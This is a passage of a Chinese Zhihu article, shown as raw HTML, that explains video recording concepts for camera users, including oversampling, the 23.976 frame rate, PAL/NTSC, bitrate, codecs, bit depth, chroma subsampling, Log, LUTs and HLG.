data-original=\"https://pic1.zhimg.com/v2-56844b28915425c0986f0ee66889c5b0_r.jpg\"></figure><p>既然集中使用中间的像素会丧失视角，那么我尽量使用整个传感器呗。 ​</p>\n<p><b>于是『跳采』这种方式出现。</b>简单来说，就是每间隔几个像素记录一个像素点的信息，其它像素的信息就不要了，如图所示。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7a04ec980152ed632e92cf4585e6a435_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-7a04ec980152ed632e92cf4585e6a435_r.jpg\"></figure><p>很棒，解决了视角裁切的问题，但是缺点也很明显，舍弃了一部分像素的信息，不论是画质上还是颜色上，都会有所欠缺。 ​</p>\n<p>有没有更好的解法，<b>有，就是超采。 ​</b></p>\n<p>在理解超采之前，得先理解传感器是如何记录颜色的。 ​</p>\n<p>实际上，像素点是不会记录颜色信息的，他只能记录光的强度，那么如果还原真实世界的色彩呢？ 不得不提『拜尔滤镜』了。在像素上放上滤色片，然后记录不同颜色的滤色片对光的过滤效果，就可以得到颜色信息。 ​</p>\n<blockquote> 具体的光学知识可以参考之前的这个回答。</blockquote>\n<p><a href=\"https://www.zhihu.com/answer/1721715927\" class=\"internal\">李明殊：彩色胶片主要是什么原理?</a></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>但是像素不是胶片的感光剂，摞三个滤色片在上边，也不能记录色彩信息，于是拜尔想了一个办法，把<a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/RGB\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RGB</a>滤色器按照一定的方式排列在相邻像素上，这样就可以根据周边的颜色数值，来算出一个『颜色』。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-71f767145414cedbdf9a10f541fa8f6d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-71f767145414cedbdf9a10f541fa8f6d_r.jpg\"></figure><p> 既然是『算出来』，那么就不是真实的。 ​</p>\n<p>​</p>\n<p>但是不可否认的是，<b>只要我输入的条件够多，结果应该更加准确，接近真实。</b> 超采就是这么一个类似的过程—— ​</p>\n<p>采集传感器上所有像素的信息，然后根据周边像素的信息算出来一个数值，然后记录。 ​</p>\n<p>为了便于理解超采，我们举一个不太严谨的例子，假如现在有一个3200万像素的相机，需要拍摄4K视频。也就是需要将四个像素变为一个像素。 </p>\n<p>假设四个像素的情况如图所示： ​</p>\n<p>跳采，选择其中一个颜色直接记录，比如1中的红色； 超采，就是根据周边的的像素，来计算出一个颜色，然后作为记录。无疑，这种方式可以获得更准确的颜色，更加锐利清晰的画面。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-582ac1bc7e85a2bbe9d0dd21f12cf653_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-582ac1bc7e85a2bbe9d0dd21f12cf653_r.jpg\"></figure><p> 看起来很棒了，超采就没有什么问题了嘛？ ​</p>\n<p>有。 ​</p>\n<p>由于超采需要计算，而计算是需要一定的时间，就会导致果冻效应更加明显。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b738fab57fe8e3586addcebff4362f61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-b738fab57fe8e3586addcebff4362f61_r.jpg\"></figure><p> 你在车上拍的电线杆子，也就会更歪一点了。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cd02e430fb1d3597bf9327893f0c6483_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-cd02e430fb1d3597bf9327893f0c6483_r.jpg\"></figure><blockquote>注: <br>即使具有超采功能的相机，不是所有的视频规格都有超采，不同的分辨率和帧率下的设定会不同。 <br>比如索尼的大部分相机，4k视频是从6K分辨率超采而来，但是1080P的规格不是； <br>超采不一定会用到整个传感器，即使是超采，也会有画面裁切（但是这个比例通常很小），只要采集的像素比最终输出的像素多，就可以称之为超采。 ​</blockquote>\n<p>​</p>\n<h2>为什么是23.98？关于帧率</h2>\n<p>戈达尔说：</p>\n<blockquote> 电影是每秒24格的真理。</blockquote>\n<p>因为视觉暂留，一秒24帧的画面，看起来流畅而且自然。 ​</p>\n<p>为了拍摄电影感的视频，你把相机的帧率调整为24帧，然后兴冲冲的拍了一段视频，但是当你把视频导入到电脑上，右键属性的时候，或者把素材放到剪辑软件中，会发现，视频的帧率是23.98。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c35eb85358b43f97bb4ccc95035830e3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-c35eb85358b43f97bb4ccc95035830e3_r.jpg\"></figure><p> 说好的24p，怎么还差我0.02，剪辑个视频都有中间商赚差价吗？ ​</p>\n<p>实际上，23.98也是个近似值，准确的数值应该是23.976，为什么是这么一个奇葩的数字？ 鲁(niu)迅(dun)曾经说过——</p>\n<blockquote> 一切看起来不合理的设定背后，都是历史遗留问题。</blockquote>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4b0725848043fa53a60451127d04d246_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-4b0725848043fa53a60451127d04d246_r.jpg\"></figure><p>美国的电源频率是60Hz，所以当年电视诞生后，电视的场频也是60Hz。 ​</p>\n<p>当时的电视采用的是隔行扫描，也就是一秒钟需要记录30张画面，也就是30fps。 </p>\n<p>但是后来彩色电视诞生，需要传输和记录色度信息，彩色副载波与亮度信号和音频载波之间的相互干扰。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b90e2e0e4f63c26fb79bdec94ba09b56_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-b90e2e0e4f63c26fb79bdec94ba09b56_r.jpg\"></figure><p>工程师为了解决这个问题，把频率下降千分之一，场频变为59.94，同理，帧率就是59.94✖️1/2=29.97。 </p>\n<p>电影的帧率也下降千分之一，24/1.001=<b>23.976</b>，看，这个神奇的数字出现了。</p>\n<blockquote> 更多详细内容，可以参考<a href=\"https://zhuanlan.zhihu.com/p/66319869\" class=\"internal\"><span class=\"invisible\">https://</span><span class=\"visible\">zhuanlan.zhihu.com/p/66</span><span class=\"invisible\">319869</span><span class=\"ellipsis\"></span></a>这篇文章。</blockquote>\n<p>当人们想用电视看电影的时候，问题就出现了，电视是29.97，电影是23.976，这帧率不一样，还怎么看？ </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-86e53144a18d61d80a1a9cff208ffca9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-86e53144a18d61d80a1a9cff208ffca9_r.jpg\"></figure><p>也就是说电影画面每四帧要塞到电视的五帧里，怎么塞? ​</p>\n<p>于是 就有了3：2pulldown的技术。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1009a52ad1c9034ac7ca92ac6199d058_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-1009a52ad1c9034ac7ca92ac6199d058_r.jpg\"></figure><p>还记得之前说的隔行扫描吗？ </p>\n<p>每个画面经过隔行之后，会产生两个画面，然后按照2323这样的方式排列，最后就可以把四帧的画面塞到五帧中。 ​</p>\n<p>虽然说已经是数字时代了，但是还有一些地区和在使用模拟信号的电视或者广播，所以23.976这样的帧率的兼容性会更好的一点。 ​</p>\n<p>其实还有一个最为主要的原因，目前的消费领域的拍摄设备，基本上都是23.98（23.976），真24p的相机或者录像机，往往比较贵。不过就相差这么一点，看不出来什么的。 ​</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>视频的制式根据各国使用的电源频率不同，分为​<b>PAL制和NTSC制。</b> </p>\n<ul>\n<li>前者有中国和德国为代表，电源频率为50Hz，视频的帧率就是25P，50P或者100P；</li>\n<li>后者以美国和日本为代表，电源频率为60Hz，视频的帧率就是30P，60P或者120P。 </li>\n</ul>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-696b202b9e3a0d181d00645de86f7687_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-696b202b9e3a0d181d00645de86f7687_r.jpg\"></figure><p>这就是有的小朋友经常会问到的一个问题，为什么我的相机宣传可以拍摄120帧的视频，为什么菜单设置里只有100P，切换一下制式就好了。</p>\n<blockquote> 这是必须得吐槽一下，索尼的相机，切换个制式还得格式化，搞不懂为什么会有这么奇葩的设定。</blockquote>\n<p>有小朋友又要问了，那我使用N制还是P制？</p>\n<p>其实现在的视频大多是网络使用，不论是N制还是P制，关系不大，选哪个都行，你开心就好，如果你有电视或者广播播放的需求，那还是选择对应的国家，以免后期的麻烦。 ​</p>\n<p>如果你有多个设备，建议还是将拍摄制式统一。 ​</p>\n<p>另外，还有一点得注意，如果你发现拍摄的场景有照明灯光，画面中出现闪烁的情况，建议还是调节成当地的制式，帧率和电源频率匹配时，就可以解决这个问题。 ​</p>\n<p>我们经常说道的慢动作拍摄，其实是一秒钟拍摄更多的画面，比如120帧，然后播放的时候按照正常的帧率播放（24帧），这样本来1s的画面，需要5秒的时间播放，自然就慢了。 ​</p>\n<p>这个过程也就是我们所说的升格。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396592972767502336\"></a><p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>既然有升格，那么就有降格</b>，相反的，一秒钟记录更少的画面，然后以正常的速度播放，就会有视频加快的感觉，最常见的降格，其实是延时摄影。 ​</p>\n<p>但是更高的帧率和分辨率会导致更大的数据量，在很多基础的相机上，高帧率和高分辨是不可兼得的，需要作出取舍。 </p>\n<p>这也是为什么目前大家对4k/60这个参数情有独钟的原因，在画质和帧率上达到了一个不错的平衡。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396594818412441600\"></a><p>​</p>\n<h2>为什么我的4K这么差 ，码率</h2>\n<p>一个显而易见的例子，手机拍摄的4k画面，有时候还不如相机拍摄的1080P。 ​</p>\n<p>按理说，4k的画面要比1080P好多很多啊，为什么？ ​</p>\n<p>决定画质的，除了分斌率，还有码率。 ​</p>\n<p>这也就是一些国内的视频网站，所谓的超高清的视频的画面看起来并不那么高清，除了分辨率虚标之外（720P就是超清，1080P就是蓝光，那4K不得起飞了？） </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f7af8c6e67ef3d5012b43501b65e3496_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2888\" data-rawheight=\"1776\" class=\"origin_image zh-lightbox-thumb\" width=\"2888\" data-original=\"https://pic3.zhimg.com/v2-f7af8c6e67ef3d5012b43501b65e3496_r.jpg\"></figure><p> 视频的码率也惨不忍睹（大多数的视频码率在2M-4M之间）。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-595956abb24f4843239b9618fe8cea12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2410\" data-rawheight=\"1382\" class=\"origin_image zh-lightbox-thumb\" width=\"2410\" data-original=\"https://pic3.zhimg.com/v2-595956abb24f4843239b9618fe8cea12_r.jpg\"></figure><blockquote> B站的码率其实都算良心的了。</blockquote>\n<p>​</p>\n<p>所谓码率，就是一秒钟记录的数据量，数据量越多，画质越好。码率决定了你文件的大小。</p>\n<p>通常手机这种设备的码率厂家已经给你写死了，没有办法调节。 ​</p>\n<p>问题来了。 对于相机这类设备来说，是否需要将码率设为最高。 ​</p>\n<p>答案也不一定，一切都要按需出发。 因为在一定的分辨率下，不断提高码率所带来的画面提升已经肉眼不可见了，文件体积却在不断地增大。 ​</p>\n<p>一个比较实用的做法是，使用你手头的机器，使用不同的码率拍摄一段看起来复杂的画面。 然后正常的进行后期调色，找到一个你分辨不出来画面差异的码率，然后用它就行了。 ​</p>\n<h2>H.265 MP4.编码与封装</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>找一个盒子装起来：封装格式</h3>\n<p>先来说格式封装，这个是大家最常见到的东西，也就是你文件的后缀名。 ​</p>\n<p>常见的格式，有MP4，和MOV，FLV等。 </p>\n<p>本质上你可以把格式理解为一个容器，可以装进去所有关于视频内容，除了帧画面，还有音频甚至字幕。 比如你在网上下载电影来看，很多都是MKV这种格式，可以塞进去多轨音频甚至多轨字幕，这也就是为什么有的电影能够切换声道的原因。</p>\n<p>​</p>\n<h3>存储的方式，编码</h3>\n<p>下来说说编码，编码就是记录画面的方式。 ​</p>\n<p>有两种记录的方式，一个是帧内编码，比如苹果的PRORES。 这种很好理解，就是直接记录每一帧画面，后期电脑直接按顺序播放这些画面就ok了。 优点就是几乎不需要什么算力，播放起来很流畅，缺点就是会占用更大的空间。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5e9c09f2c0bfdd13efb4bf4e85822c05_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-5e9c09f2c0bfdd13efb4bf4e85822c05_r.jpg\"></figure><p>这也就是为什么同样的配置的电脑，往往使用Final cut Pro剪辑要比Adobe Primier 流畅很多的原因，正是因为Final Cut Pro 使用PRORES的编码方式，但本质上，这是一种『以空间换速度』的做法。 ​</p>\n<p>很多小伙伴们用Final Cut剪视频，剪到一半，突然发现硬盘空间没了，就是这个原因。 </p>\n<p>不过可以在剪辑完成后删除这类优化代理渲染文件，来节省空间，不过如果你有大量的素材，那建议还是搞个外置的大容量SSD或者直接连接Nas剪辑，体验会更好。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396593311218532353\"></a><p>PRORES是一种中间编码，仅用于中间的视频编辑过程，也就是说，最后视频输出还得靠H.264。 </p>\n<p>H.264是一种帧间编码。 </p>\n<p>简单来说，他只记录每帧之间的变化值，然后解码器根据变化来『算出』中间的画面。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-afc5ab4ff8a658414ab61f2ab79ae992_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-afc5ab4ff8a658414ab61f2ab79ae992_r.jpg\"></figure><p>比如我拍摄一个采访视频，嘉宾基本上坐着不动，背景啥的都没有变化，只记录变化的部分，最大的好处文件体积就会小很多，但是解码播放时，却增加了算力的要求。 ​</p>\n<p>H.264应用十分广泛，几乎应用在所有的设备和产品上。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7765a7001ebe1dbc0c315da619829417_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-7765a7001ebe1dbc0c315da619829417_r.jpg\"></figure><p>他的下一代是H.265，更好的体积压缩，更好的画质。 ​</p>\n<p>但是我们目前的播放和处理设备对于H.265的支持都不太好，也就是说，你直接用当前的电脑剪辑H265编码的视频，会卡的惨不忍睹。</p>\n<p>卡了怎么办？除了换电脑之外，买显卡之外，还可以通过剪辑软件生成代理素材来剪辑。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-db47846040c6df5336c3b4dced840bab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-db47846040c6df5336c3b4dced840bab_r.jpg\"></figure><p> 是一种『以时间换性能的做法』。 ​</p>\n<h2>10bit 422—色深与色度采样</h2>\n<p>10bit 422， 8Bit 420这是我们在看相机参数时，经常会看到的一串数值。 他们到底说的是啥？ ​</p>\n<h3>越深越好，色深</h3>\n<p>先说这个10bit ,色深。 如果你经常使用Photoshop，或者一些设计软件。会经常看到#FFB6C1这样的数值，他们称之为色值。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cddc2294c47565a5794b1818e3259d2f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-cddc2294c47565a5794b1818e3259d2f_r.jpg\"></figure><p> 通常由6位十六进制字符代表，红绿蓝 每种颜色占用两位。 ​</p>\n<p>也就是说，每一种颜色有16*16种变化，这个数值正好的2的8次方，所以我们把这种颜色称为8位色深，也就是8bit。 ​</p>\n<p>很容易计算，8bit色深的颜色一共有256×256×256=16,777,216 种颜色，也就是我们经常说的1600万色。 ​</p>\n<p>虽然看起来也不少了，但是在实际的拍摄体验中，尤其是渐变的场景，后期稍微拉一下，就会遇到色彩断层的问题。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3a31a4c48177e43e8738628c6fa50dfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-3a31a4c48177e43e8738628c6fa50dfc_r.jpg\"></figure><p>而10bit，最终色彩总量可以达到10亿色，由于颜色增多，色彩的过渡会更加的自然，哪怕最终输出的还是8bit的画面，依旧可以获得很不错的画面。 ​</p>\n<p>​</p>\n<p>​</p>\n<h3>谁还不是为了省钱啊：色度采样</h3>\n<p>​</p>\n<p>为了数字化的记录颜色，人们搞出来了『色彩空间』这样一个模型。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9d84b3c081572d1558a148294d4a0f5c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-9d84b3c081572d1558a148294d4a0f5c_r.jpg\"></figure><p> 不同的色彩空间有着不同的特点，应用于不同的领域： 我们最为熟悉的RGB，是一种加法色，应用最为广泛，设备显示，图像处理； CMYK，是一种减法色，通常用印刷行业； RGB发光屏幕的加色模式，依赖于光线，CMYK是一种颜色反光的印刷减色模式，依赖于颜料。有<b>所依赖就会有所不足</b>。所以Lab模式诞生，理论上，Lab可以包含所有色彩。 ​</p>\n<p>但是在电视或者数码摄影系统中，我们通常上使用Y'CBCR这种色彩模式。</p>\n<blockquote> 实际上，Y'CBCR不是一种绝对色彩空间，而是YUV压缩和偏移的版本，但是由于Y'CBCR的应用实在是太广泛了，所有大多时候，我们口中所说YUV指的就是Y'CBCR。</blockquote>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1a7b62a75e45b29098b0c53437130dbd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-1a7b62a75e45b29098b0c53437130dbd_r.jpg\"></figure><p> 其中： </p>\n<p>Y'代表光的浓度，也就是亮度，而且这个值是非线性的。 </p>\n<p>Cb和Cr代表蓝色和红色浓度的偏移量，包含色度和色差信息。 ​</p>\n<p>常见的格式有以下几种,用一个三分比值表示：</p>\n<ul>\n<li>4:4:4</li>\n<li>4:2:2</li>\n<li>4:2:0​</li>\n</ul>\n<p>第一个值，区域的宽度，也就是区域的像素数量，通常上为4； </p>\n<p>第二个值，第一行像素的色度抽样数目； </p>\n<p>第三个值，第二行的色度采样值。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-cb2de30cf8990d5da5bbe1ea9181c730_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-cb2de30cf8990d5da5bbe1ea9181c730_r.jpg\"></figure><p>比如我们来看4:4:4这种格式，区域的宽度为4个像素，第一行抽样的数值为4，第二行也是4，也就是所有的信息都被采集到了。这是一种对于色彩细节保留最好的格式。 ​</p>\n<p>同理，4:2:2和4:2:0的取样情况如下。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5b18cd70a502658eb8a7a8c13937f39e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-5b18cd70a502658eb8a7a8c13937f39e_r.jpg\"></figure><p> 可以明显看到，4:2:2损失了50%的信息，而4:2:0几乎损失了75%的信息。 ​</p>\n<p>即使如此，损失了50%的4:2:2也被视为<b>高品质的专业视频格式，</b>比如索尼家的微单相机，目前应该只有A7S3和A1支持4:2:2的视频格式，其他的主流机型，目前还停留在4:2:0上。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396593804573499393\"></a><blockquote> 注：<br>在比较图像质量，比值才是重点，你可以把4:4:4称为1:1:1，但是习惯和约定俗成的情况下，取样的总样本范围还是为4，这也就是为什么没人16:10称为8:5的原因，无他，习惯耳。</blockquote>\n<p>​</p>\n<p>可能有小伙伴要问了，为什么要采样呢，搞的这么复杂？ ​</p>\n<p>鲁(niu)迅(dun)又曾经说过——</p>\n<blockquote>人们的很多选择，多半是为了效率（省钱）。</blockquote>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9b267035f50c2c72be95f96d2be65a61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-9b267035f50c2c72be95f96d2be65a61_r.jpg\"></figure><p> 要使用4:4:4不仅是对于拍摄器材的性能要求极高，存储上，也吃不消。 ​</p>\n<p>还有一个最主要的原因是，眼睛<b>对于微调的色度不太敏感。</b> <b>​</b></p>\n<p>也就是说，Cr和Cb可以用<b>一点点的样本就能进行编码，而且可见的质量损失微乎其微</b>，却节省了大量的数据量。 </p>\n<p>这也就是你即使用保留了25%的色彩信息的4:2:0去拍，实际的观感也没有那么差的原因。 ​</p>\n<p>但是你如果要进行复杂的后期，甚至抠像特效的时候，你就会发现，4:2:0的画面用起来就有点捉襟见肘了，还是得上4:2:2。</p>\n<h2>RAW，Log，Rec709，HLG又是什么</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>RAW，（生）肉</h3>\n<p>玩摄影的朋友，想必对于RAW很熟悉了，记录了传感器采集到的所有的光线的信息。 严格来说，RAW并不是一种图片格式，而是一个数据包。 </p>\n<p>拍的RAW格式的视频，与图片类似（本质上视频就是一张张图片拼接起来嘛）。 ​</p>\n<p><b>拥有的最大的后期空间</b>，但是能够拍摄RAW视频的器材不多，都是比较专业的摄影机，比如RED，ARRI之流，都十分的昂贵，但是有一个例外，就是适马fp，机身小巧，也不算贵，能够拍摄 cinemaDNG序列（也算是一种RAW视频了）。 ​</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396595820192501760\"></a><p>其实所有的拍摄设备，都有RAW的这个过程，为什么不把RAW数据直接给你呢？ ​</p>\n<p>RAW是个数据量杀手，你刚塞进去一张128G的SD卡，还没有一分钟呢，嚯，卡满了。而是对于后期处理也是一个大难题，流程繁琐，并不适合大多数据消费者使用。 ​</p>\n<h3>Log，指数观察世界</h3>\n<p>人眼能看清楚明亮的天空，也能辨别阴影的细节。 这就说明人眼对于光线的感知并不是线性的，这也就是中性灰是18%，而不是50%的原因。 ​</p>\n<p>为了尽量的拟合人眼识光线明暗的特点，人们找到了log这个函数来模拟。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d643b12381600664f5e99ab68600e809_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-d643b12381600664f5e99ab68600e809_r.jpg\"></figure><p> 为的就是记录更多的明暗数据，换句话说，就是把暗部拉上去，把亮度压下来（是不是像极了后期照片时减高光，加阴影的操作？）来让画面有用更高的动态范围。 ​</p>\n<p>不同的厂家有着不同的Log曲线，比如佳能的是C-log，索尼家的是S-log，富士家是F-log，松下的是V-log（注意不是拍的吃饭旅游的那个玩意）。 ​</p>\n<p>即使是同一家厂商，Log曲线也有不同的版本，比如C-log就有1，2，3的区别，在暗部，亮部的捕获表现上都会有细微的差异。</p>\n<p>但是直接观看Log画面，会显得十分的『灰』。 ​</p>\n<p>如何观看正确的色彩呢？这时候LUT就登场了。 基本上所有的厂家都会提供自己log模式的还原Lut，可以很轻易的地官网找到。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-843d22d2e3e74800f3ce30c9d3d006ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-843d22d2e3e74800f3ce30c9d3d006ae_r.jpg\"></figure><p> 日常使用Log拍摄时，需要注意以下两个问题： ​</p>\n<p>起跳ISO，比如，索尼的Slog3的起跳ISO是800，如果在打白天，也想使用大光圈拍摄，那么减光镜就是不可或缺的配件； ​</p>\n<p>对于精准曝光要求极高，所以你得上监视器，或者使用直方图，斑马纹来确认你的曝光是否准确，相信我，大多数新手拍Log会在精准曝光上载无数个跟头，一个比较实用的曝光的经验是，<b>在保留画面信息的基础上，尽量向右曝光。</b></p>\n<blockquote>注:<br>有些相机厂商虽然也支持RAW外录和N-log，但是需要你『花钱』升级​固件，比如尼康Z6/7</blockquote>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>Lut：是滤镜吗</h3>\n<p>Lut，即为look up table，直译就是颜色查找表，输入一个值，然后换成另外一个值，从而达到调色的目的。 是不是看起来跟滤镜的作用一样，但实际上原理是相当不同的。 你可以简单理解为，LUT是颜色替换，而滤镜是计算。 ​</p>\n<p>当然，你也可以在网上找到无数的Lut，有兴趣的话，也可以自己做一个。​</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>HLG</h3>\n<p>随着技术的进步，HDR设备开始普及，包括你手头的旗舰手机几乎都开始支持HDR了。 </p>\n<blockquote>关于更多关于HDR的介绍，可以参考我之见的回答。 </blockquote>\n<p><a href=\"https://www.zhihu.com/question/19774840/answer/660920430\" class=\"internal\">HDR 是什么？有哪些具体介绍？</a></p>\n<p> ​</p>\n<p>相机们也可以加入了HDR视频的拍摄能力。 ​</p>\n<p>这里就不得不提HLG标准了，HLG是BBC和NHK联合开发HDR标准，提供了编码宽动态范围（HDR）的能力，也保留了标准动态范围（SDR）的支持，使得他的兼容性很好。</p>\n<p>而且HLG标准并不需要你掏专利费，所以很多厂商也纷纷投入了HLG怀抱，比如索尼，松下，甚至大疆的大多数设备，都可以拍摄HLG视频。由于采用的是相同的标准，即使是不同厂家的设备拍摄的HLG视频，后期在颜色匹配上也比较完美。 ​</p>\n<blockquote> p.s  <br>iPhone12拍摄的HDR视频，标准为杜比视界。实际上iPhone12拍摄的也是HLG视频，只不过加了一层杜比视界的元数据层。</blockquote>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396596932685529088\"></a><p>​</p>\n<p>相对于Log，HLG还有以下两个特点： ​</p>\n<p>画面没有那么灰，颜色显示较为正常，甚至不用处理也可以直出使用； 没有起跳ISO的限制，使用起来比较方便。 ​</p>\n<p>HLG同Log一样，也有HLG1，HLG2，HLG3的区别，在暗部和亮部的保留和取舍上各有倾向。要依据你实际拍摄的画面而定。有空了可以深入探讨这个问题。 ​</p>\n<p>对于日常使用或者新手来讲，HLG明显更加友好。 ​</p>\n<p>​</p>\n<h3>Rec.709，色彩标准</h3>\n<p>​</p>\n<p>这是一个1990年发布的统一色彩标准，色域和sRGB相同。 